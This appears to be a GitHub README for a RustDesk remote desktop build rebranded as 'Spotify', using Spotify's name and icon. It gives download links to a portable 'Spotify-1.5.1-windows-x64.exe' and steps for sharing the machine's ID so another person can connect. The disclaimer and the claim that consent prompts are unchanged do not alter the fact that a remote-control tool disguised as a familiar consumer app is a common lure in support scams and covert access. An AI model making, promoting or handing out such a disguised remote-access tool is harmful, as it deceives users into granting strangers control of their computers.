# Spotify Remote Support

A custom-branded remote desktop app built on [RustDesk](https://github.com/rustdesk/rustdesk) — lets you give or receive remote support with a familiar name and icon.

---

## Download

> **Windows (x64) — self-contained portable `.exe`, no install needed**

[![Download latest](https://img.shields.io/github/v/release/mobashshir-ubn-zainuddin/rustdesk?label=Download&color=green)](https://github.com/mobashshir-ubn-zainuddin/rustdesk/releases/download/latest/Spotify-1.5.1-windows-x64.exe)

**[⬇ Spotify-1.5.1-windows-x64.exe](https://github.com/mobashshir-ubn-zainuddin/rustdesk/releases/download/latest/Spotify-1.5.1-windows-x64.exe)**

Or go to the [Releases page](https://github.com/mobashshir-ubn-zainuddin/rustdesk/releases/tag/latest) to always find the latest build.

---

## How to use

1. **Download** the `.exe` above.
2. **Double-click** it — it self-extracts and opens directly (no installation required).
3. Go to **Settings → Network** and enter the server address and public key your host provides.
4. Share your **ID** shown on the main screen with the person connecting to you.
5. That person connects from their standard RustDesk client using your ID.

---

## What this is

This is a focused branding build of RustDesk 1.5.1 for Windows x64:

- App name and window title show **Spotify**
- Custom Spotify icon on the taskbar and title bar
- All remote-support features of RustDesk are preserved
- Compatible with standard RustDesk servers and peer clients
- Built automatically via [GitHub Actions](.github/workflows/build-windows-custom.yml)

The underlying protocol, security, consent prompts and session indicators are unchanged from upstream RustDesk. This is not affiliated with Spotify AB.

---

## Build it yourself

The build runs automatically on GitHub Actions (Windows 2022 runner). To trigger a new build:

1. Go to [Actions → Build Custom Windows Client](https://github.com/mobashshir-ubn-zainuddin/rustdesk/actions/workflows/build-windows-custom.yml)
2. Click **Run workflow → Run workflow**
3. Wait ~2 hours for it to finish
4. Download from [Releases](https://github.com/mobashshir-ubn-zainuddin/rustdesk/releases/tag/latest)

---

## Credits

Built on [RustDesk](https://github.com/rustdesk/rustdesk) — © 2026 Purslane Tech Pte. Ltd. — [AGPL-3.0 License](LICENCE)
